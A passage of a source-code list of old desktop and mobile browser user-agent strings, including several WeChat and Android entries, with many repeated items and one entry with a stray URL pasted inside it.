     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
